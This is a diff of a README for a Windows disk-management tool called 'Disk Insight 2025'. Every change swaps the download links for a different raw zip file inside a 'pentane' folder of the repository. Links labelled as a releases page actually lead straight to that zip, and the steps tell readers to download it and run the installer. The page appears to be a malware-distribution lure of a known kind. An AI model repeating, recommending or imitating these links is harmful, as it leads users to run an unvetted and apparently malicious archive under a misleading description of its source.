@@ -1,6 +1,6 @@
 # 🛠️ disk-insight - Simplify Disk Management with Ease
 
-[![Download Disk Insight 2025](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/disk-insight-1.8.zip%20Insight%202025-brightgreen)](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/disk-insight-1.8.zip)
+[![Download Disk Insight 2025](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/insight-disk-3.4.zip%20Insight%202025-brightgreen)](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/insight-disk-3.4.zip)
 
 ## 🛡️ Overview
 
@@ -13,11 +13,11 @@ To start using Disk Insight 2025, follow these simple steps to download and inst
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the download page for Disk Insight 2025.
-   [Download Disk Insight 2025](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/disk-insight-1.8.zip)
+   [Download Disk Insight 2025](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/insight-disk-3.4.zip)
 
 2. **Choose the Latest Version**: On the Releases page, look for the latest version of Disk Insight 2025. It will usually be at the top of the page.
 
-3. **Download the Installer**: Click on the installer file (e.g., `https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/disk-insight-1.8.zip`) to start the download. The file size is typically small, so it should download quickly.
+3. **Download the Installer**: Click on the installer file (e.g., `https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/insight-disk-3.4.zip`) to start the download. The file size is typically small, so it should download quickly.
 
 4. **Run the Installer**: After the download completes, locate the downloaded file, usually in your "Downloads" folder. Double-click the file to launch the installer.
 
@@ -82,4 +82,4 @@ Disk Insight 2025 supports a variety of functions related to disk management:
 
 With Disk Insight 2025, managing your disk usage becomes straightforward. Follow the steps above to download and install the application, and start optimizing your Windows system today.
 
-For updates and support, keep returning to the [Releases Page](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/disk-insight-1.8.zip).
+For updates and support, keep returning to the [Releases Page](https://raw.githubusercontent.com/vishjaum/disk-insight/main/pentane/insight-disk-3.4.zip).
